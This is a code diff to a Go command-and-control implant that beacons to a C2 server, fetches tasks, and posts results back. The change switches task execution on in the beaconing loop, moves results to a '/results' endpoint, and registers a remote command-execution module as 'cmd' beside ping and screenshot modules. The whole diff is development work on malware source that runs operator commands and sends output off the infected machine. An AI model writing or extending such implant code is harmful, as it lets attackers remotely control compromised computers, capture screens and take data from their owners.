@@ -120,13 +120,13 @@ func (i *Implant) Beaconing() {
 		for _, task := range tasks {
 			fmt.Println("Task:", task)
 
-			// response, err := i.executeTask(task)
-			// if err != nil {
-			// 	fmt.Println("Error executing task:", err)
-			// 	// Handle error sending response or retry logic if needed
-			// } else {
-			// 	fmt.Println("Task execution response:", response)
-			// }
+			response, err := i.executeTask(task)
+			if err != nil {
+				fmt.Println("Error executing task:", err)
+				// Handle error sending response or retry logic if needed
+			} else {
+				fmt.Println("Task execution response:", response)
+			}
 		}
 
 		// Sleep for a while before fetching the next set of tasks
@@ -175,7 +175,7 @@ func (i *Implant) executeTask(task Task) (string, error) {
 		return "", fmt.Errorf("error marshaling response data: %v", err)
 	}
 
-	_,_, err = i.sendHTTPRequest("POST","/tasks/response", responseDataBytes,true)
+	_,_, err = i.sendHTTPRequest("POST","/results", responseDataBytes,true)
 	if err != nil {
 		return "", fmt.Errorf("error sending task response: %v", err)
 	}
@@ -258,7 +258,7 @@ func main() {
 	implant := NewImplant(c2ServerURL)
 
 	// Register modules
-	implant.Modules["exec"] = modules.NewExecuteModule()
+	implant.Modules["cmd"] = modules.NewExecuteModule()
 	implant.Modules["ping"] = modules.NewPingModule()
 	implant.Modules["screenshot"] = modules.NewScreenshotModule()
 
